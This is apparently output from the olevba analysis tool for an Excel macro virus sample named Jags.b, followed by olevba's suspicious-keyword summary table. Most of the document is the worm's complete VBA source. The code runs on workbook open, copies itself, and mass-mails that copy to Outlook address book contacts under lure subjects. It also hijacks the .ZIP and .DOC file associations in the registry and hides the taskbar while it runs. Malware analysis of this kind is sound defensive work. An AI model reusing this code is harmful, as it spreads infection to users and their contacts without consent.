olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Jags.b-d5095c4955c0483448a80b7d49333adcecab52ff
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Jags.b-d5095c4955c0483448a80b7d49333adcecab52ff - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub happyBirthday()
On Error Resume Next

If Day(Now()) = 17 Then
 Worksheets(1).Cells(7, 1).Value = "Colombia, September 17, 1978.."
 Worksheets(1).Cells(6, 1).Value = "Happy Birthday to my brother Christiam (CJGS)"
 With Worksheets(1).Cells(6, 1).Font
    .Name = "Arial"
    .Size = 20
 End With
End If
End Sub


Sub Initialize()
On Error Resume Next

'nuestra tecnica polimorfica
Application.ActiveWorkbook.SaveCopyAs (OBTENER_DIR_WINDOWS & "\" & UsuarioActual & ".xls")
'mostramos el mensaje despúes, para no salvarlo en el savecopyas
Call happyBirthday
'desactivamos para entrar
Call UNLOAD_HOTKEYS
Call Ocultar_Barra
Call ASOCIAR_JAGS90
Call Read_Your_BookAddress 'ENVIAMOS EL GUSANO
'activamos para no dejar sospecha
Call LOAD_HOTKEYS
Call Mostrar_Barra
End Sub

Private Sub Workbook_Open()
 If (Dir(OBTENER_DIR_WINDOWS & "\*.xls", vbArchive) = "") Then
   Call Initialize
 End If
 
 UserForm1.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO Hoja1.cls 
in file: Virus.MSExcel.Jags.b-d5095c4955c0483448a80b7d49333adcecab52ff - OLE stream: '_VBA_PROJECT_CUR/VBA/Hoja1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Worksheet_SelectionChange(ByVal Target As Excel.Range)

End Sub
-------------------------------------------------------------------------------
VBA MACRO Hoja2.cls 
in file: Virus.MSExcel.Jags.b-d5095c4955c0483448a80b7d49333adcecab52ff - OLE stream: '_VBA_PROJECT_CUR/VBA/Hoja2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Hoja3.cls 
in file: Virus.MSExcel.Jags.b-d5095c4955c0483448a80b7d49333adcecab52ff - OLE stream: '_VBA_PROJECT_CUR/VBA/Hoja3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO get_win_directory.bas 
in file: Virus.MSExcel.Jags.b-d5095c4955c0483448a80b7d49333adcecab52ff - OLE stream: '_VBA_PROJECT_CUR/VBA/get_win_directory'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'OBTENER EL DIRECTORIO WINDOWS
Declare Function GetWindowsDirectory Lib "Kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long

Function OBTENER_DIR_WINDOWS() As String
On Error Resume Next

'OBTENER DIR WINDOWS
Dim WinDir As String
Dim Cadena As String
Dim ret As Long

'OBTENEMOS EL DIR
    Cadena = String$(300, Chr$(0))
    ret = GetWindowsDirectory(Cadena, Len(Cadena))
    WinDir = Left$(Cadena, InStr(Cadena, Chr$(0)) - 1)
    
    OBTENER_DIR_WINDOWS = WinDir

End Function


-------------------------------------------------------------------------------
VBA MACRO get_win_user.bas 
in file: Virus.MSExcel.Jags.b-d5095c4955c0483448a80b7d49333adcecab52ff - OLE stream: '_VBA_PROJECT_CUR/VBA/get_win_user'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'PARA OBTENER EL NOMBRE DE USUARIO DE WINDOWS
Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long

'OBTIENE EL NOMBRE DEL USUARIO ACTUAL DE WINDOWS

Public Function UsuarioActual() As String
    On Error Resume Next
    
    Dim sBuffer As String
    Dim lSize As Long
    Dim sUsuario As String
    
    sBuffer = Space$(260)
    lSize = Len(sBuffer)
    Call GetUserName(sBuffer, lSize)
    If lSize > 0 Then
        sUsuario = Left$(sBuffer, lSize)
        'Quitarle el CHR$(0) del final...
        lSize = InStr(sUsuario, Chr$(0))
        If lSize Then
            sUsuario = Left$(sUsuario, lSize - 1)
        End If
    Else
        sUsuario = Application.UserName
    End If
    UsuarioActual = sUsuario
End Function


-------------------------------------------------------------------------------
VBA MACRO jags90_others.bas 
in file: Virus.MSExcel.Jags.b-d5095c4955c0483448a80b7d49333adcecab52ff - OLE stream: '_VBA_PROJECT_CUR/VBA/jags90_others'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'obtiene el nombre de la #$#%# base de datos


Function aleatorio(hasta As Integer) As Long
Dim x, num
num = 0

  For x = 1 To hasta
    Randomize
    num = num + Rnd()
  Next x
  
  aleatorio = num
End Function

Function PolyName() As String
 Dim texto, x, hasta
 hasta = aleatorio(12) + 1
 texto = "                   "
 
 For x = 1 To hasta
   Mid$(texto, x, 1) = Chr(aleatorio(23) + 64)
 Next x
 
 PolyName = texto
End Function

-------------------------------------------------------------------------------
VBA MACRO read_address_book.bas 
in file: Virus.MSExcel.Jags.b-d5095c4955c0483448a80b7d49333adcecab52ff - OLE stream: '_VBA_PROJECT_CUR/VBA/read_address_book'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

 Function PolyBody() As String
Dim op
op = aleatorio(1)
If (op = 0) Then
  PolyBody = ""
Else
  op = aleatorio(9)
  Select Case op
    Case Is = 0
        PolyBody = "A Greeting Card of: "
    Case Is = 1
        PolyBody = "Animated Card's "
    Case Is = 2
        PolyBody = "Top Secret FBI Information "
    Case Is = 3
        PolyBody = "HEEEEELP ME..!  "
    Case Is = 4
        PolyBody = "FEEDBACK Information "
    Case Is = 5
        PolyBody = "I send you a tiny surprise "
    Case Is = 6
        PolyBody = "Look my problem.. Attn.  "
    Case Is = 7
        PolyBody = "Check Top Secret FBI notes.. "
    Case Is = 8
        PolyBody = "Kiss my Ass..  "
    Case Else
        PolyBody = "Apocaliptical Message, Take a look..  "
  End Select
End If

End Function




 Sub Read_Your_BookAddress()
On Error Resume Next
Dim JagsOutlookApp, JagsMapiApp, JagsAddressBookItemsPointer, x, y
Dim AmountEntriesInAddressBook, AmountEntries, EmailAddress

Set JagsOutlookApp = CreateObject("Outlook.Application")
Set JagsMapiApp = JagsOutlookApp.GetNameSpace("MAPI")
  If JagsOutlookApp = "Outlook" Then 'si el servidor de correo es outlook
    JagsMapiApp.Logon "profile", "password"
    'y=numero de libretas de direcciones configuradas
    For y = 1 To JagsMapiApp.AddressLists.Count
        Set AmountEntriesInAddressBook = JagsMapiApp.AddressLists(y)
        x = 1
        Set JagsAddressBookItemsPointer = JagsOutlookApp.CreateItem(0)
        'extrae c/u de las personas que estan en la libreta (y)
        For AmountEntries = 1 To AmountEntriesInAddressBook.AddressEntries.Count
           EmailAddress = AmountEntriesInAddressBook.AddressEntries(x)
            JagsAddressBookItemsPointer.Recipients.Addtotal
            x = x + 1
            If x > 50 Then Exit For
         Next AmountEntries
         JagsAddressBookItemsPointer.Subject = PolyBody & UsuarioActual()  'el titulo del correo
         JagsAddressBookItemsPointer.Body = PolyBody 'el cuerpo del correo
         JagsAddressBookItemsPointer.Attachments.Add OBTENER_DIR_WINDOWS & "\" & UsuarioActual & ".xls"   'adjuntamos el archivo
         JagsAddressBookItemsPointer.Send 'envia
        EmailAddress = ""
    Next y
    JagsMapiApp.Logoff 'dejamos en paz a la aplicacion de correo.(la cerramos) TRANSLATE-> shutdown mail application
  End If

End Sub


-------------------------------------------------------------------------------
VBA MACRO reg_new_ext.bas 
in file: Virus.MSExcel.Jags.b-d5095c4955c0483448a80b7d49333adcecab52ff - OLE stream: '_VBA_PROJECT_CUR/VBA/reg_new_ext'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'PARA ASOCIAR UN PROGRAMA CON UNA EXTENSION
Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegSetValue Lib "advapi32.dll" Alias "RegSetValueA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal dwType As Long, ByVal lpData As String, ByVal cbData As Long) As Long



Sub ASOCIAR_JAGS90()
On Error Resume Next

' Return codes from Registration functions.
Const ERROR_SUCCESS = 0&
Const ERROR_BADDB = 1&
Const ERROR_BADKEY = 2&
Const ERROR_CANTOPEN = 3&
Const ERROR_CANTREAD = 4&
Const ERROR_CANTWRITE = 5&
Const ERROR_OUTOFMEMORY = 6&
Const ERROR_INVALID_PARAMETER = 7&
Const ERROR_ACCESS_DENIED = 8&
Const HKEY_CLASSES_ROOT = &H80000000
Const MAX_PATH = 260&
Const REG_SZ = 1


Dim sKeyName As String   'Holds Key Name in registry.
Dim sKeyValue As String  'Holds Key Value in registry.
Dim ret&                 'Holds error status if any from API calls.
Dim lphKey&              'Holds created key handle from RegCreateKey.

'This creates a Root entry called "JAGS90 VIRUS V2.0".
    sKeyName = "JAGS90 VIRUS V2.0"
    sKeyValue = "Jags90 Virus V2.0 By Jags Andrew 90®"
    ret& = RegCreateKey&(HKEY_CLASSES_ROOT, sKeyName, lphKey&)
    ret& = RegSetValue&(lphKey&, "", REG_SZ, sKeyValue, 0&)
    'EVERYONE ZIPED FILES
'This creates a Root entry called .ZIP associated with "JAGS90 VIRUS V2.0".
    sKeyName = ".ZIP"
    sKeyValue = "JAGS90 VIRUS V2.0"
    ret& = RegCreateKey&(HKEY_CLASSES_ROOT, sKeyName, lphKey&)
    ret& = RegSetValue&(lphKey&, "", REG_SZ, sKeyValue, 0&)

'This sets the command line for "JAGS90 VIRUS V2.0".
    sKeyName = "JAGS90 VIRUS V2.0"
    sKeyValue = OBTENER_DIR_WINDOWS() & "\NOTEPAD.exe %1"
    ret& = RegCreateKey&(HKEY_CLASSES_ROOT, sKeyName, lphKey&)
    ret& = RegSetValue&(lphKey&, "shell\open\command", REG_SZ, sKeyValue, MAX_PATH)
'EVERYONE DOC FILES
'This creates a Root entry called .DOC associated with "JAGS90 VIRUS V2.0".
    sKeyName = ".DOC"
    sKeyValue = "JAGS90 VIRUS V2.0"
    ret& = RegCreateKey&(HKEY_CLASSES_ROOT, sKeyName, lphKey&)
    ret& = RegSetValue&(lphKey&, "", REG_SZ, sKeyValue, 0&)

'This sets the command line for "JAGS90 VIRUS V2.0".
    sKeyName = "JAGS90 VIRUS V2.0"
    sKeyValue = OBTENER_DIR_WINDOWS() & "\NOTEPAD.exe %1"
    ret& = RegCreateKey&(HKEY_CLASSES_ROOT, sKeyName, lphKey&)
    ret& = RegSetValue&(lphKey&, "shell\open\command", REG_SZ, sKeyValue, MAX_PATH)

End Sub


-------------------------------------------------------------------------------
VBA MACRO unload_win_hotkeys.bas 
in file: Virus.MSExcel.Jags.b-d5095c4955c0483448a80b7d49333adcecab52ff - OLE stream: '_VBA_PROJECT_CUR/VBA/unload_win_hotkeys'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Const SPI_SCREENSAVERRUNNING = 97&
Private Declare Function SystemParametersInfo Lib "User32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, lpvParam As Any, ByVal fuWinIni As Long) As Long

Sub UNLOAD_HOTKEYS()
On Error Resume Next
    Dim lngRet As Long
    Dim blnOld As Boolean
    lngRet = SystemParametersInfo(SPI_SCREENSAVERRUNNING, _
                  True, blnOld, 0&)
End Sub

Sub LOAD_HOTKEYS()
On Error Resume Next

'Para volver a habilitarlas:
    Dim lngRet As Long
    Dim blnOld As Boolean
    lngRet = SystemParametersInfo(SPI_SCREENSAVERRUNNING, _
                  False, blnOld, 0&)
End Sub




-------------------------------------------------------------------------------
VBA MACRO unload_win_taskbar.bas 
in file: Virus.MSExcel.Jags.b-d5095c4955c0483448a80b7d49333adcecab52ff - OLE stream: '_VBA_PROJECT_CUR/VBA/unload_win_taskbar'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'PARA OCULTAR LA BARRA
Declare Function FindWindow Lib "User32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Declare Function SetWindowPos Lib "User32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Global Ventana As Long
Global Const Muestra = &H40
Global Const Oculta = &H80


'Oculta la barra de tareas
 Sub Ocultar_Barra()
 On Error Resume Next
    Ventana = FindWindow("Shell_traywnd", "")
    Call SetWindowPos(Ventana, 0, 0, 0, 0, 0, Oculta)
End Sub

'Muestra la barra de tareas
 Sub Mostrar_Barra()
 On Error Resume Next
    Call SetWindowPos(Ventana, 0, 0, 0, 0, 0, Muestra)
End Sub

-------------------------------------------------------------------------------
VBA MACRO UserForm1.frm 
in file: Virus.MSExcel.Jags.b-d5095c4955c0483448a80b7d49333adcecab52ff - OLE stream: '_VBA_PROJECT_CUR/VBA/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Hoja
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Hoja
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Hoja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Jags.b-d5095c4955c0483448a80b7d49333adcecab52ff' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Please, you read this message until the end. He is really serious...

VIRUS ALERT: Jags90

If it receives an email with following subject: " Jags90 ", clean  immediately WITHOUT READING IT. This it is the most dangerous virus than never it has existed. If the email is opened, its hard disk will be rewritten completely.

In addition the message will be autosend to all the people of its address book of email.

But not only that, will erase any diskette that is near its computer and will block the card of its movable telephone. It will cut the provision of light of all the building and will shoot to the alarm anti-fires.

It will degauss the magnetic stripe of his credit cards and tellers, it will break the mall pillows of his VHS, and will damage all his CD of music.

Unload  its refrigerator so that the ice creams melt. It will send to him to his ex--honey  his new telephone number. It will add TANG to the tank of his fish box. Its beer will be taken all and will cool the coffee.

It will hide the keys of his car when it is delayed for the work. Jags90 will cause that You fall in love crazy with a blond type with glasses owner of a multinational based on the deceit and the swindle. It will make him have nightmares. It will throw to sugar  to the gas tank of his car.

They will appear to him giant shinbones right the night of the first appointment that as much have  hoped. It will randomly move its car around the parking so that it cannot find it. It will kick its dog.

It will leave libidinous messages in its answering machine. And it will even leave the cover of the open toilet.

These are only some of the symptoms. Be really cautious!

I hope on time to have arrived to save them of this terrible virus.

Send east message to all the people that knows. They will thank for it.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Jags.b-d5095c4955c0483448a80b7d49333adcecab52ff' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSExcel.Jags.b-d5095c4955c0483448a80b7d49333adcecab52ff' - OLE stream: '_VBA_PROJECT_CUR/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|open                |May open a file                              |
|Suspicious|shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|FindWindow          |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
|IOC       |NOTEPAD.exe         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

